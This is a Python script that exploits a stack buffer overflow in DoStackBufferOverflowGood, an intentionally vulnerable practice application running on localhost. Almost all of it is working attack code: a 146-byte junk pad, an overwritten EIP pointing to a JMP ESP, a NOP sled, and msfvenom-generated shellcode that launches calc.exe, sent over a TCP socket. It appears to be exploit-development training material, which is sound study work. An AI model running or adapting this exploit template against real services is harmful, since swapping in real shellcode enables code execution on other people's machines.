#		Created By: ReverseThrottle
#		01/24/23
# 	Exploiting DoStackBufferOverflowGood 
#		Using a stack based buffer overflow
# 	NO DEP / NO ASLR
#   App can be found here - https://github.com/justinsteven/dostackbufferoverflowgood


import socket 

server = '127.0.0.1'
port = 31337

# msfvenom -p windows/exec CMD=calc.exe -b '\x00\x0a' -f py
shellcode =  b""
shellcode += b"\xda\xd8\xb8\xbf\xf4\x88\x8c\xd9\x74\x24\xf4\x5a\x31"
shellcode += b"\xc9\xb1\x31\x83\xc2\x04\x31\x42\x14\x03\x42\xab\x16"
shellcode += b"\x7d\x70\x3b\x54\x7e\x89\xbb\x39\xf6\x6c\x8a\x79\x6c"
shellcode += b"\xe4\xbc\x49\xe6\xa8\x30\x21\xaa\x58\xc3\x47\x63\x6e"
shellcode += b"\x64\xed\x55\x41\x75\x5e\xa5\xc0\xf5\x9d\xfa\x22\xc4"
shellcode += b"\x6d\x0f\x22\x01\x93\xe2\x76\xda\xdf\x51\x67\x6f\x95"
shellcode += b"\x69\x0c\x23\x3b\xea\xf1\xf3\x3a\xdb\xa7\x88\x64\xfb"
shellcode += b"\x46\x5d\x1d\xb2\x50\x82\x18\x0c\xea\x70\xd6\x8f\x3a"
shellcode += b"\x49\x17\x23\x03\x66\xea\x3d\x43\x40\x15\x48\xbd\xb3"
shellcode += b"\xa8\x4b\x7a\xce\x76\xd9\x99\x68\xfc\x79\x46\x89\xd1"
shellcode += b"\x1c\x0d\x85\x9e\x6b\x49\x89\x21\xbf\xe1\xb5\xaa\x3e"
shellcode += b"\x26\x3c\xe8\x64\xe2\x65\xaa\x05\xb3\xc3\x1d\x39\xa3"
shellcode += b"\xac\xc2\x9f\xaf\x40\x16\x92\xed\x0e\xe9\x20\x88\x7c"
shellcode += b"\xe9\x3a\x93\xd0\x82\x0b\x18\xbf\xd5\x93\xcb\x84\x2a"
shellcode += b"\xde\x56\xac\xa2\x87\x02\xed\xae\x37\xf9\x31\xd7\xbb"
shellcode += b"\x08\xc9\x2c\xa3\x78\xcc\x69\x63\x90\xbc\xe2\x06\x96"
shellcode += b"\x13\x02\x03\xf5\xf2\x90\xcf\xd4\x91\x10\x75\x29"


# Response that is sent to the server
# Junk data holding 146 characters
payload = b""
junk = b"A" * 146
# Address of opcodes JMP ESP
eip = b"\xc3\x14\x04\x08"
# Breakpoint to verify that EIP was over-written properly
# bp = b"\xcc"
# No operation opcode used for stability 
nop = b"\x90" * 20

# Final payload
payload += junk + eip + nop + shellcode

# Creates socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Makes connection to the server
connect = s.connect((server, port))

# Sends payload to the server
s.send(payload + b'\r\n')

# Prints the returned response from the server
print(s.recv(1024))

# Closes the connection to the server
s.close()
